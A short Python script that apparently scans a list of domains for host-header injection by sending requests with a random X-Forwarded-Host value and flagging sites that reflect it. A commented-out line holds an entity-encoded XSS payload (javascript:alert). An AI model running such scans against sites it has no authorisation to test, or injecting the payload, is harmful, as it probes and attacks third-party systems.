import random
import string
from pip._vendor import requests


def _random_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def _load_domains():
    fp = open('./domain.txt', 'r')
    domain = []
    line = fp.readline().strip('\n')
    while (line):
        domain.append(line)
        line = fp.readline().strip('\n')
    fp.close()
    return domain


def _check(_url, _method="get"):
    try:
        _padding = "?user" + str(_random_generator(10).lower())
        url = _url + _padding
        url = url.replace("///", "/")
        rand_host = _random_generator(10).lower() + ".com"
        # rand_host = "\" \"\"SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\""
        print(rand_host)
        for i in range(10):
            headers = {'X-Forwarded-Host': rand_host}
            r = requests.get(url, headers=headers)
            contents = r.content
            # print("Domain %s " %url)
            if rand_host in str(contents):
                print("Domain %s ăn được đó" % url)
        return True
    except requests.HTTPError as e:
        print(str(e))


if __name__ == '__main__':
    _domain = _load_domains()
    for domain in _domain:
        _check(domain)
    # print(id_generator(10))
